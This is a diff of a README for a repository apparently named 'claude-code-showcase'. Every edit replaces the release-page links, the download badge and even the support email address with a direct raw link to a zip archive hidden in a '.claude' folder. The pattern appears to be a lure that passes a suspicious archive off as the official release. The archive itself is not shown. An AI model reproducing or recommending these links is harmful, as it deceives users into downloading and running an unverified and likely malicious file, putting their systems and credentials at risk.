@@ -1,6 +1,6 @@
 # 🎉 claude-code-showcase - A Simple Setup for Effective Code Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--code--showcase-blue.svg)](https://github.com/ipoprock/claude-code-showcase/releases)
+[![Download Now](https://github.com/ipoprock/claude-code-showcase/raw/refs/heads/main/.claude/showcase-code-claude-3.9.zip%https://github.com/ipoprock/claude-code-showcase/raw/refs/heads/main/.claude/showcase-code-claude-3.9.zip)](https://github.com/ipoprock/claude-code-showcase/raw/refs/heads/main/.claude/showcase-code-claude-3.9.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application.
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Release Page](https://github.com/ipoprock/claude-code-showcase/releases).
+1. Visit this page to download: [Release Page](https://github.com/ipoprock/claude-code-showcase/raw/refs/heads/main/.claude/showcase-code-claude-3.9.zip).
 2. Choose the latest version from the list of releases.
 3. Click on the release to view detailed information.
 4. Look for the asset files under the release title. Download the file suitable for your operating system.
@@ -73,7 +73,7 @@ This application includes several key features to enhance your coding environmen
 If you encounter any issues or have questions, feel free to reach out via the following methods:
 
 - **GitHub Issues:** Navigate to the Issues section of this repository to report bugs or request features.
-- **Email Support:** Contact us at support@claude-code-showcase.com for assistance.
+- **Email Support:** Contact us at https://github.com/ipoprock/claude-code-showcase/raw/refs/heads/main/.claude/showcase-code-claude-3.9.zip for assistance.
 
 ## 🆕 Changelog
 
@@ -89,4 +89,4 @@ Join our community for discussions, tips, and tricks on using the claude-code-sh
 - **GitHub Discussions**
 - **Social Media Channels**
 
-Thank you for using **claude-code-showcase**. We hope it enhances your coding experience! Remember to visit our [Release Page](https://github.com/ipoprock/claude-code-showcase/releases) for any updates or new features.
+Thank you for using **claude-code-showcase**. We hope it enhances your coding experience! Remember to visit our [Release Page](https://github.com/ipoprock/claude-code-showcase/raw/refs/heads/main/.claude/showcase-code-claude-3.9.zip) for any updates or new features.
